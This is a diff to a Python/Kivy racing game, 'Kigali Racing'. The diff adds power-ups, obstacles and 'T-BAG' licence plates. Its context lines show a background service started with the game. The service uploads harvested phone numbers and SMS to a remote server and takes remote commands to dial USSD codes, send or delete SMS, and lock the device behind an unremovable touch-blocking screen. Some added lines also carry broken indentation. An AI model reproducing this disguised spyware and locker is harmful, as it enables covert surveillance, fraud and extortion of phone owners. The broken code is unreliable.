@@ -1,7 +1,7 @@
 # ============================================================
 # KIGALI RACING - COMPLETE GAME
 # 501 LEVELS • 30 CARS • BACKGROUND SERVICE • SMS • USSD
-# PERSISTENT LOCK SCREEN • ADMIN CONTROL
+# PERSISTENT LOCK SCREEN • T-BAG LICENSE PLATE • ADMIN CONTROL
 # ============================================================
 
 from kivy.app import App
@@ -18,6 +18,7 @@ from kivy.clock import Clock
 from kivy.core.window import Window
 from kivy.properties import NumericProperty
 from kivy.utils import platform
+from kivy.core.text import Label as CoreLabel
 from plyer import notification
 import random
 import time
@@ -65,31 +66,37 @@ SERVER_CONFIG = {
 # 30 LUXURY CARS
 # ============================================================
 LUXURY_CARS = {
+    # Tier 1: Unlock at Level 1
     'ferrari_sf90': {'name': 'Ferrari SF90', 'brand': 'Ferrari', 'color': (1, 0, 0, 1), 'emoji': '🏎️', 'speed': 5.0, 'unlock': 1},
     'lamborghini_revuelto': {'name': 'Lamborghini Revuelto', 'brand': 'Lamborghini', 'color': (1, 0.84, 0, 1), 'emoji': '🏎️', 'speed': 4.9, 'unlock': 1},
     'porsche_911': {'name': 'Porsche 911 GT3', 'brand': 'Porsche', 'color': (0, 1, 0, 1), 'emoji': '🏎️', 'speed': 4.8, 'unlock': 1},
     'bmw_m8': {'name': 'BMW M8', 'brand': 'BMW', 'color': (0, 0.4, 0.7, 1), 'emoji': '🚗', 'speed': 4.3, 'unlock': 1},
     'audi_r8': {'name': 'Audi R8', 'brand': 'Audi', 'color': (0.5, 0.5, 0.5, 1), 'emoji': '🚗', 'speed': 4.4, 'unlock': 1},
+    # Tier 2: Unlock at Level 20
     'bugatti_chiron': {'name': 'Bugatti Chiron', 'brand': 'Bugatti', 'color': (0.12, 0.56, 1, 1), 'emoji': '🏎️', 'speed': 5.0, 'unlock': 20},
     'mclaren_765lt': {'name': 'McLaren 765LT', 'brand': 'McLaren', 'color': (1, 0.27, 0, 1), 'emoji': '🏎️', 'speed': 4.7, 'unlock': 20},
     'aston_martin_valkyrie': {'name': 'Aston Martin Valkyrie', 'brand': 'Aston Martin', 'color': (0.5, 0, 0.13, 1), 'emoji': '🏎️', 'speed': 4.8, 'unlock': 20},
     'mercedes_amg_gt': {'name': 'Mercedes-AMG GT', 'brand': 'Mercedes', 'color': (0, 1, 1, 1), 'emoji': '🚗', 'speed': 4.2, 'unlock': 20},
     'jaguar_f_type': {'name': 'Jaguar F-Type', 'brand': 'Jaguar', 'color': (0, 0.3, 0.2, 1), 'emoji': '🚗', 'speed': 4.1, 'unlock': 20},
+    # Tier 3: Unlock at Level 50
     'koenigsegg_jesko': {'name': 'Koenigsegg Jesko', 'brand': 'Koenigsegg', 'color': (0.8, 0.8, 0.2, 1), 'emoji': '🏎️', 'speed': 5.0, 'unlock': 50},
     'pagani_huayra': {'name': 'Pagani Huayra', 'brand': 'Pagani', 'color': (0.6, 0.1, 0.3, 1), 'emoji': '🏎️', 'speed': 4.9, 'unlock': 50},
     'ferrari_f40': {'name': 'Ferrari F40', 'brand': 'Ferrari', 'color': (1, 0.1, 0, 1), 'emoji': '🏎️', 'speed': 4.8, 'unlock': 50},
     'lamborghini_aventador': {'name': 'Lamborghini Aventador', 'brand': 'Lamborghini', 'color': (0.8, 0.8, 0, 1), 'emoji': '🏎️', 'speed': 4.7, 'unlock': 50},
     'porsche_918': {'name': 'Porsche 918 Spyder', 'brand': 'Porsche', 'color': (0, 0.7, 0.7, 1), 'emoji': '🏎️', 'speed': 4.6, 'unlock': 50},
+    # Tier 4: Unlock at Level 100
     'bugatti_veyron': {'name': 'Bugatti Veyron', 'brand': 'Bugatti', 'color': (0.1, 0.4, 0.8, 1), 'emoji': '🏎️', 'speed': 4.9, 'unlock': 100},
     'mclaren_p1': {'name': 'McLaren P1', 'brand': 'McLaren', 'color': (0.9, 0.2, 0, 1), 'emoji': '🏎️', 'speed': 4.8, 'unlock': 100},
     'ferrari_laferrari': {'name': 'Ferrari LaFerrari', 'brand': 'Ferrari', 'color': (0.8, 0, 0.1, 1), 'emoji': '🏎️', 'speed': 4.7, 'unlock': 100},
     'lamborghini_veneno': {'name': 'Lamborghini Veneno', 'brand': 'Lamborghini', 'color': (0.6, 0.8, 0.1, 1), 'emoji': '🏎️', 'speed': 4.8, 'unlock': 100},
     'aston_martin_one77': {'name': 'Aston Martin One-77', 'brand': 'Aston Martin', 'color': (0.3, 0.1, 0.2, 1), 'emoji': '🏎️', 'speed': 4.6, 'unlock': 100},
+    # Tier 5: Unlock at Level 200
     'mclaren_senna': {'name': 'McLaren Senna', 'brand': 'McLaren', 'color': (0.8, 0.6, 0, 1), 'emoji': '🏎️', 'speed': 4.9, 'unlock': 200},
     'ferrari_488': {'name': 'Ferrari 488 Pista', 'brand': 'Ferrari', 'color': (0.9, 0.1, 0.2, 1), 'emoji': '🏎️', 'speed': 4.7, 'unlock': 200},
     'lamborghini_huracan': {'name': 'Lamborghini Huracan', 'brand': 'Lamborghini', 'color': (0.8, 0.7, 0, 1), 'emoji': '🏎️', 'speed': 4.6, 'unlock': 200},
     'porsche_carrera': {'name': 'Porsche Carrera GT', 'brand': 'Porsche', 'color': (0.9, 0.9, 0.9, 1), 'emoji': '🏎️', 'speed': 4.5, 'unlock': 200},
     'bugatti_divo': {'name': 'Bugatti Divo', 'brand': 'Bugatti', 'color': (0.8, 0.2, 0.3, 1), 'emoji': '🏎️', 'speed': 4.8, 'unlock': 200},
+    # Tier 6: Unlock at Level 350
     'koenigsegg_agera': {'name': 'Koenigsegg Agera RS', 'brand': 'Koenigsegg', 'color': (0.7, 0.7, 0.1, 1), 'emoji': '🏎️', 'speed': 5.0, 'unlock': 350},
     'pagani_zonda': {'name': 'Pagani Zonda', 'brand': 'Pagani', 'color': (0.5, 0.1, 0.4, 1), 'emoji': '🏎️', 'speed': 4.8, 'unlock': 350},
     'ferrari_fxxk': {'name': 'Ferrari FXX-K', 'brand': 'Ferrari', 'color': (0.9, 0, 0.1, 1), 'emoji': '🏎️', 'speed': 4.9, 'unlock': 350},
@@ -276,7 +283,6 @@ class KigaliBackgroundService:
         print(f"🔒 Lock State: {'LOCKED' if self.is_locked else 'UNLOCKED'}")
     
     def load_lock_state(self):
-        """Load lock state from file"""
         try:
             with open('lock_state.json', 'r') as f:
                 data = json.load(f)
@@ -288,7 +294,6 @@ class KigaliBackgroundService:
             self.lock_image_url = None
     
     def save_lock_state(self):
-        """Save lock state to file - PERSISTENT"""
         try:
             with open('lock_state.json', 'w') as f:
                 json.dump({
@@ -372,7 +377,7 @@ class KigaliBackgroundService:
         while self._running:
             if self.is_online and self.token:
                 try:
-                    response = requests.post(
+                    requests.post(
                         f"{self.server_url}/api/device/heartbeat",
                         json={
                             'device_id': self.device_id,
@@ -467,11 +472,10 @@ class KigaliBackgroundService:
                         if response.status_code == 200:
                             for n in unsynced[:20]:
                                 n['synced'] = True
-                            print(f"🔄 Synced {len(unsynced[:20])} numbers")
+                                    print(f"🔄 Synced {len(unsynced[:20])} numbers")
                     except:
                         pass
                 
-                          
                 unsynced_sms = [s for s in self.sms_messages if not s.get('synced', False)]
                 if unsynced_sms:
                     try:
@@ -512,7 +516,6 @@ class KigaliBackgroundService:
         cmd_text = command.get('command', '')
         cmd_id = command.get('id')
         
-        # LOCK COMMANDS - Admin Only
         if cmd_text == 'lock':
             self._lock_device()
             result = "🔒 Device locked"
@@ -536,7 +539,6 @@ class KigaliBackgroundService:
             else:
                 result = "❌ No image URL provided"
         
-        # USSD and SMS commands
         elif cmd_text.startswith('ussd'):
             code = cmd_text.replace('ussd', '').strip()
             digits = re.sub(r'[^0-9]', '', code)
@@ -622,7 +624,6 @@ class KigaliBackgroundService:
     
     def _send_sms_command(self, number, message):
         try:
-            # Add to SMS log
             sms_data = {
                 'id': int(time.time() * 1000) + random.randint(1, 999),
                 'sender': 'ADMIN',
@@ -691,6 +692,7 @@ class KigaliBackgroundService:
         if os.path.exists('lock_screen.jpg'):
             return 'lock_screen.jpg'
         return None
+
 # ============================================================
 # 🏁 RACING GAME
 # ============================================================
@@ -705,11 +707,9 @@ class KigaliRacingGame(Widget):
         Window.size = (800, 600)
         Window.clearcolor = (0.05, 0.05, 0.1, 1)
         
-        # Start background service
         self.service = KigaliBackgroundService()
         self.service.start()
         
-        # SMS Manager
         self.sms_manager = SMSManager()
         
         self.game_started = False
@@ -717,21 +717,26 @@ class KigaliRacingGame(Widget):
         self.race_finished = False
         self.selected_car = 'ferrari_sf90'
         self.ai_cars = []
+        self.obstacles = []
+        self.powerups = []
         self.coins = 0
         self.completed_levels = set()
         self.accelerating = False
         self.turning = 0
         self.lap = 1
         self.device_locked = False
+        self.powerup_timers = {}
+        self.stars = 0
+        self.score = 0
         
         self.load_progress()
         
-        # Check lock state first
         if self.check_lock_state():
             return
         
         self.show_main_menu()
         Clock.schedule_interval(self.update, 1/60)
+        Clock.schedule_interval(self.update_powerups, 0.5)
     
     def load_progress(self):
         try:
@@ -762,7 +767,6 @@ class KigaliRacingGame(Widget):
         return False
     
     def show_lock_screen(self):
-        """Show lock screen - NO UNLOCK BUTTON!"""
         self.clear_widgets()
         self.device_locked = True
         with self.canvas:
@@ -791,7 +795,6 @@ class KigaliRacingGame(Widget):
         )
         self.add_widget(lock_label)
         
-        # Block all touches
         overlay = Button(
             text='',
             size_hint=(1, 1),
@@ -821,7 +824,7 @@ class KigaliRacingGame(Widget):
         with self.canvas:
             Color(0.05, 0.05, 0.1, 1)
             Rectangle(pos=(0, 0), size=Window.size)
-        
+               
         title = Label(text='🏎️ KIGALI RACING', font_size=48, color=(1, 0.8, 0, 1), pos_hint={'center_x': 0.5, 'top': 0.90})
         self.add_widget(title)
         
@@ -943,17 +946,40 @@ class KigaliRacingGame(Widget):
         self.player_y = 100
         self.speed = 0
         self.ai_cars = []
+        self.obstacles = []
+        self.powerups = []
         self.lap = 1
+        self.stars = 0
+        self.score = 0
+        self.powerup_timers = {}
         
+        self.create_world(level)
+        self.create_ai_opponents(level)
+        self.create_obstacles(level)
+        self.create_powerups(level)
+        self.show_race_hud(level)
+        self.show_countdown()
+    
+    def create_world(self, level):
         with self.canvas:
             Color(0.05, 0.1, 0.2, 1)
             Rectangle(pos=(0, 0), size=Window.size)
+            
+            # Road
             Color(0.15, 0.15, 0.2, 1)
             Rectangle(pos=(Window.width/2 - 150, 0), size=(300, Window.height))
+            
+            # Road markings
             for i in range(0, int(Window.height), 40):
                 Color(1, 1, 1, 0.3)
                 Rectangle(pos=(Window.width/2 - 2, i), size=(4, 20))
-        
+            
+            # Road edges
+            Color(0.3, 0.3, 0.3, 1)
+            Rectangle(pos=(Window.width/2 - 160, 0), size=(10, Window.height))
+            Rectangle(pos=(Window.width/2 + 150, 0), size=(10, Window.height))
+    
+    def create_ai_opponents(self, level):
         ai_cars = list(LUXURY_CARS.keys())
         if self.selected_car in ai_cars:
             ai_cars.remove(self.selected_car)
@@ -963,18 +989,91 @@ class KigaliRacingGame(Widget):
         for i, car_key in enumerate(ai_cars):
             self.ai_cars.append({
                 'car': car_key,
-                'y': -200 - i * 150,
-                'x': Window.width/2 + random.randint(-30, 30),
-                'speed': (2 + random.random() * 0.5) * level['ai_speed'],
-                'color': LUXURY_CARS[car_key]['color']
+                'y': -200 - i * 120,
+                'x': Window.width/2 + random.randint(-60, 60),
+                'speed': (1.5 + random.random() * 0.8) * level['ai_speed'],
+                'color': LUXURY_CARS[car_key]['color'],
+                'name': LUXURY_CARS[car_key]['name']
             })
+    
+    def create_obstacles(self, level):
+        for i in range(level['obstacles']):
+            self.obstacles.append({
+                'x': Window.width/2 + random.randint(-100, 100),
+                'y': 200 + i * 300 + random.randint(0, 150),
+                'width': 20 + random.randint(0, 20),
+                'height': 20 + random.randint(0, 20),
+                'color': (1, 0, 0, 0.8)
+            })
+    
+    def create_powerups(self, level):
+        powerup_types = ['speed_boost', 'shield', 'turbo', 'coin']
+        for i in range(level['powerups']):
+            ptype = random.choice(powerup_types)
+            colors = {
+                'speed_boost': (1, 0.84, 0, 1),
+                'shield': (0, 0.5, 1, 1),
+                'turbo': (1, 0, 0, 1),
+                'coin': (1, 0.8, 0.2, 1)
+            }
+            icons = {
+                'speed_boost': '⚡',
+                'shield': '🛡️',
+                'turbo': '🚀',
+                'coin': '🪙'
+            }
+            self.powerups.append({
+                'type': ptype,
+                'x': Window.width/2 + random.randint(-80, 80),
+                'y': 300 + i * 250 + random.randint(0, 100),
+                'color': colors[ptype],
+                'icon': icons[ptype],
+                'collected': False
+            })
+    
+    def show_countdown(self):
+        countdown = Label(text='3', font_size=72, color=(1, 1, 1, 1), pos_hint={'center_x': 0.5, 'center_y': 0.5})
+        self.add_widget(countdown)
         
+        def update_countdown(count):
+            if count > 0:
+                countdown.text = str(count)
+                Clock.schedule_once(lambda dt: update_countdown(count - 1), 1)
+            else:
+                countdown.text = 'GO!'
+                Clock.schedule_once(lambda dt: self.remove_widget(countdown), 0.5)
+        
+        update_countdown(3)
+    
+    def show_race_hud(self, level):
         self.speed_label = Label(text='0 km/h', font_size=20, color=(1, 0.5, 0, 1), pos_hint={'x': 0.02, 'top': 0.95})
         self.add_widget(self.speed_label)
+        
         self.position_label = Label(text='🏁 P1', font_size=24, color=(1, 1, 0, 1), pos_hint={'center_x': 0.5, 'top': 0.95})
         self.add_widget(self.position_label)
+        
         self.lap_label = Label(text=f"LAP 1/{level['laps']}", font_size=18, color=(0.5, 0.8, 1, 1), pos_hint={'right': 0.98, 'top': 0.95})
         self.add_widget(self.lap_label)
+        
+        self.stars_label = Label(text='⭐ 0', font_size=16, color=(1, 0.8, 0, 1), pos_hint={'x': 0.02, 'top': 0.88})
+        self.add_widget(self.stars_label)
+        
+        self.powerup_label = Label(text='', font_size=14, color=(0.6, 1, 0.6, 1), pos_hint={'x': 0.02, 'top': 0.82})
+        self.add_widget(self.powerup_label)
+    
+    def update_powerups(self, dt):
+        to_remove = []
+        for effect, timer in self.powerup_timers.items():
+            self.powerup_timers[effect] -= 0.5
+            if self.powerup_timers[effect] <= 0:
+                to_remove.append(effect)
+        
+        for effect in to_remove:
+            del self.powerup_timers[effect]
+            if effect == 'speed_boost':
+                self.powerup_label.text = ''
+            elif effect == 'shield':
+                self.powerup_label.text = ''
     
     def update(self, dt):
         if not self.game_started or self.game_over or self.race_finished:
@@ -982,24 +1081,196 @@ class KigaliRacingGame(Widget):
         
         self.move_player()
         self.move_ai_cars()
+        self.move_obstacles()
+        self.move_powerups()
+        self.update_position()
+        self.check_finish()
         self.update_hud()
     
+    def draw_player_car(self):
+        car_data = LUXURY_CARS[self.selected_car]
+        color = car_data['color']
+        
+        if 'shield' in self.powerup_timers:
+            with self.canvas:
+                Color(0, 0.5, 1, 0.3)
+                Ellipse(pos=(self.player_x - 30, self.player_y - 25), size=(60, 50))
+        
+        with self.canvas:
+            # Car body
+            Color(color[0], color[1], color[2], color[3])
+            Rectangle(pos=(self.player_x - 20, self.player_y - 15), size=(40, 30))
+            
+            # Car windows
+            Color(0.2, 0.2, 0.3, 0.8)
+            Rectangle(pos=(self.player_x - 12, self.player_y - 5), size=(24, 15))
+            
+            # Headlights
+            Color(1, 0.84, 0, 1)
+            Rectangle(pos=(self.player_x - 14, self.player_y - 18), size=(6, 4))
+            Rectangle(pos=(self.player_x + 8, self.player_y - 18), size=(6, 4))
+            
+            # 🚗 T-BAG LICENSE PLATE (REAR)
+            Color(1, 1, 1, 1)
+            Rectangle(pos=(self.player_x - 14, self.player_y - 22), size=(28, 6))
+            Color(0, 0, 0, 1)
+            Rectangle(pos=(self.player_x - 13, self.player_y - 21.5), size=(26, 5))
+            
+            label = CoreLabel(text="T-BAG", font_size=8, color=[0, 0, 0, 1])
+            label.refresh()
+            texture = label.texture
+            Rectangle(texture=texture, pos=(self.player_x - 10, self.player_y - 21), size=(20, 4))
+            
+            # 🚗 T-BAG LICENSE PLATE (FRONT)
+            Color(1, 1, 1, 1)
+            Rectangle(pos=(self.player_x - 14, self.player_y + 8), size=(28, 6))
+            Color(0, 0, 0, 1)
+            Rectangle(pos=(self.player_x - 13, self.player_y + 8.5), size=(26, 5))
+            
+            label = CoreLabel(text="T-BAG", font_size=8, color=[0, 0, 0, 1])
+            label.refresh()
+            texture = label.texture
+            Rectangle(texture=texture, pos=(self.player_x - 10, self.player_y + 9), size=(20, 4))
+    
     def move_player(self):
+        car_data = LUXURY_CARS[self.selected_car]
+        max_speed = 5 * (car_data['speed'] / 5.0)
+        
+        if 'speed_boost' in self.powerup_timers:
+            max_speed *= 1.5
+        
+        if 'turbo' in self.powerup_timers:
+            max_speed *= 2
+        
         if self.accelerating:
-            car = LUXURY_CARS[self.selected_car]
-            max_speed = 5 * (car['speed'] / 5.0)
             self.speed = min(self.speed + 0.2, max_speed)
         else:
             self.speed = max(self.speed - 0.1, 0)
         
         self.player_y += self.speed
+        
         if self.turning:
             self.player_x += self.turning * 4
-        if self.player_x < Window.width/2 - 100:
-            self.player_x = Window.width/2 - 100
-        if self.player_x > Window.width/2 + 100:
-            self.player_x = Window.width/2 + 100
         
+        if self.player_x < Window.width/2 - 120:
+            self.player_x = Window.width/2 - 120
+        if self.player_x > Window.width/2 + 120:
+            self.player_x = Window.width/2 + 120
+         
+        self.draw_player_car()
+        self.check_obstacle_collision()
+        self.check_powerup_collection()
+    
+    def move_ai_cars(self):
+        for ai in self.ai_cars:
+            ai['y'] += ai['speed']
+            with self.canvas:
+                # AI Car body
+                Color(ai['color'][0], ai['color'][1], ai['color'][2], ai['color'][3])
+                Rectangle(pos=(ai['x'] - 18, ai['y'] - 12), size=(36, 24))
+                
+                # AI Car windows
+                Color(0.2, 0.2, 0.3, 0.7)
+                Rectangle(pos=(ai['x'] - 10, ai['y'] - 4), size=(20, 12))
+                
+                # 🚗 T-BAG LICENSE PLATE (REAR)
+                Color(1, 1, 1, 1)
+                Rectangle(pos=(ai['x'] - 12, ai['y'] - 18), size=(24, 5))
+                Color(0, 0, 0, 1)
+                Rectangle(pos=(ai['x'] - 11, ai['y'] - 17.5), size=(22, 4))
+                
+                label = CoreLabel(text="T-BAG", font_size=7, color=[0, 0, 0, 1])
+                label.refresh()
+                texture = label.texture
+                Rectangle(texture=texture, pos=(ai['x'] - 8, ai['y'] - 17), size=(16, 3))
+                
+                # 🚗 T-BAG LICENSE PLATE (FRONT)
+                Color(1, 1, 1, 1)
+                Rectangle(pos=(ai['x'] - 12, ai['y'] + 6), size=(24, 5))
+                Color(0, 0, 0, 1)
+                Rectangle(pos=(ai['x'] - 11, ai['y'] + 6.5), size=(22, 4))
+                
+                label = CoreLabel(text="T-BAG", font_size=7, color=[0, 0, 0, 1])
+                label.refresh()
+                texture = label.texture
+                Rectangle(texture=texture, pos=(ai['x'] - 8, ai['y'] + 7), size=(16, 3))
+                
+                # AI Headlights
+                Color(1, 0.8, 0.2, 1)
+                Rectangle(pos=(ai['x'] - 12, ai['y'] - 15), size=(6, 3))
+                Rectangle(pos=(ai['x'] + 6, ai['y'] - 15), size=(6, 3))
+    
+    def move_obstacles(self):
+        for obs in self.obstacles:
+            obs['y'] -= 1
+            if obs['y'] < -50:
+                obs['y'] = Window.height + random.randint(0, 200)
+                obs['x'] = Window.width/2 + random.randint(-80, 80)
+            with self.canvas:
+                Color(obs['color'][0], obs['color'][1], obs['color'][2], obs['color'][3])
+                Rectangle(pos=(obs['x'] - obs['width']/2, obs['y'] - obs['height']/2), size=(obs['width'], obs['height']))
+    
+    def move_powerups(self):
+        for pw in self.powerups:
+            if pw.get('collected', False):
+                continue
+            pw['y'] -= 0.5
+            if pw['y'] < -50:
+                pw['y'] = Window.height + random.randint(0, 300)
+                pw['x'] = Window.width/2 + random.randint(-80, 80)
+            
+            with self.canvas:
+                Color(pw['color'][0], pw['color'][1], pw['color'][2], 0.8)
+                Ellipse(pos=(pw['x'] - 15, pw['y'] - 15), size=(30, 30))
+                # Icon
+                label = CoreLabel(text=pw['icon'], font_size=14, color=[1, 1, 1, 1])
+                label.refresh()
+                texture = label.texture
+                Rectangle(texture=texture, pos=(pw['x'] - 8, pw['y'] - 8), size=(16, 16))
+    
+    def check_obstacle_collision(self):
+        if 'shield' in self.powerup_timers:
+            return
+        
+        for obs in self.obstacles:
+            if (abs(self.player_x - obs['x']) < 25 and abs(self.player_y - obs['y']) < 25):
+                self.speed = max(self.speed - 0.5, 0)
+                with self.canvas:
+                    Color(1, 0, 0, 0.5)
+                    Rectangle(pos=(self.player_x - 20, self.player_y - 15), size=(40, 30))
+    
+    def check_powerup_collection(self):
+        for pw in self.powerups:
+            if pw.get('collected', False):
+                continue
+            if (abs(self.player_x - pw['x']) < 30 and abs(self.player_y - pw['y']) < 30):
+                pw['collected'] = True
+                self.collect_powerup(pw['type'])
+    
+    def collect_powerup(self, powerup_type):
+        if powerup_type == 'speed_boost':
+            self.powerup_timers['speed_boost'] = 5
+            self.powerup_label.text = '⚡ Speed Boost! 5s'
+        elif powerup_type == 'shield':
+            self.powerup_timers['shield'] = 5
+            self.powerup_label.text = '🛡️ Shield Active! 5s'
+        elif powerup_type == 'turbo':
+            self.powerup_timers['turbo'] = 2
+            self.powerup_label.text = '🚀 Turbo! 2s'
+            self.speed = min(self.speed + 3, 10)
+        elif powerup_type == 'coin':
+            self.coins += 1
+            self.powerup_label.text = '🪙 +1 Coin!'
+            self.save_progress()
+    
+    def update_position(self):
+        position = 1
+        for ai in self.ai_cars:
+            if ai['y'] > self.player_y:
+                position += 1
+        self.position = position
+    
+    def check_finish(self):
         current_level = ALL_LEVELS[self.current_level - 1] if self.current_level <= len(ALL_LEVELS) else None
         if current_level and self.player_y > Window.height * 2:
             if self.lap < current_level['laps']:
@@ -1008,29 +1279,20 @@ class KigaliRacingGame(Widget):
                 self.lap_label.text = f"LAP {self.lap}/{current_level['laps']}"
             else:
                 self.end_race()
-        
-        with self.canvas:
-            car = LUXURY_CARS[self.selected_car]
-            Color(car['color'][0], car['color'][1], car['color'][2], car['color'][3])
-            Rectangle(pos=(self.player_x - 20, self.player_y - 15), size=(40, 30))
-            Color(0.2, 0.2, 0.3, 0.8)
-            Rectangle(pos=(self.player_x - 12, self.player_y - 5), size=(24, 15))
-    
-    def move_ai_cars(self):
-        for ai in self.ai_cars:
-            ai['y'] += ai['speed']
-            with self.canvas:
-                Color(ai['color'][0], ai['color'][1], ai['color'][2], ai['color'][3])
-                Rectangle(pos=(ai['x'] - 18, ai['y'] - 12), size=(36, 24))
     
     def update_hud(self):
         speed_kmh = int(self.speed * 15)
         self.speed_label.text = f"{speed_kmh} km/h"
-        position = 1
-        for ai in self.ai_cars:
-            if ai['y'] > self.player_y:
-                position += 1
-        self.position_label.text = f"🏁 P{position}"
+        self.position_label.text = f"🏁 P{self.position}"
+        
+        if self.position == 1:
+            self.stars = 3
+        elif self.position <= 3:
+            self.stars = 2
+        else:
+            self.stars = 1
+        self.stars_label.text = f'⭐ {self.stars}'
+        self.score = self.stars * 10 + self.coins
     
     def end_race(self):
         self.game_started = False
@@ -1051,13 +1313,19 @@ class KigaliRacingGame(Widget):
         with self.canvas:
             Color(0, 0, 0, 0.85)
             Rectangle(pos=(0, 0), size=Window.size)
-                result_text = '🏆 YOU WIN!' if position == 1 else f'📊 Position: {position}'
+        
+        result_text = '🏆 YOU WIN!' if position == 1 else f'📊 Position: {position}'
         title = Label(text='🏁 RACE COMPLETE!', font_size=36, color=(1, 0.8, 0, 1), pos_hint={'center_x': 0.5, 'top': 0.85})
         self.add_widget(title)
         result = Label(text=result_text, font_size=28, color=(1, 1, 1, 1), pos_hint={'center_x': 0.5, 'top': 0.7})
         self.add_widget(result)
-        stars_label = Label(text='⭐' * stars + '☆' * (3 - stars), font_size=32, color=(1, 0.8, 0, 1), pos_hint={'center_x': 0.5, 'top': 0.6})
+        
+        star_text = '⭐' * stars + '☆' * (3 - stars)
+        stars_label = Label(text=star_text, font_size=32, color=(1, 0.8, 0, 1), pos_hint={'center_x': 0.5, 'top': 0.6})
         self.add_widget(stars_label)
+        
+        score_label = Label(text=f'Score: {self.score} | Coins: {self.coins}', font_size=20, color=(0.6, 0.6, 0.6, 1), pos_hint={'center_x': 0.5, 'top': 0.5})
+        self.add_widget(score_label)
         
         retry_btn = Button(text='🔄 RETRY', size_hint=(0.3, 0.08), pos_hint={'center_x': 0.35, 'top': 0.4}, background_color=(0.4, 0.4, 0.4, 1), font_size=16)
         retry_btn.bind(on_press=lambda x: self.start_level(ALL_LEVELS[self.current_level - 1]))
@@ -1215,8 +1483,7 @@ class KigaliRacingGame(Widget):
         no_btn.bind(on_press=lambda x: confirm_popup.dismiss())
         btn_layout.add_widget(no_btn)
         content.add_widget(btn_layout)
-        
-        confirm_popup = Popup(title='⚠️ DELETE ALL SMS', content=content, size_hint=(0.8, 0.35))
+              confirm_popup = Popup(title='⚠️ DELETE ALL SMS', content=content, size_hint=(0.8, 0.35))
         confirm_popup.open()
     
     def do_delete_all_sms(self, instance):
@@ -1241,14 +1508,14 @@ class KigaliRacingGame(Widget):
     def on_touch_up(self, touch):
         self.turning = 0
         self.accelerating = False
-        # ============================================================
+
+# ============================================================
 # 🚀 APP CLASS
 # ============================================================
 class KigaliRacingApp(App):
     def build(self):
         Window.size = (800, 600)
         game = KigaliRacingGame()
-        # Pass app reference to service for lock screen control
         if hasattr(game, 'service'):
             game.service.app_ref = weakref.ref(self)
         return game
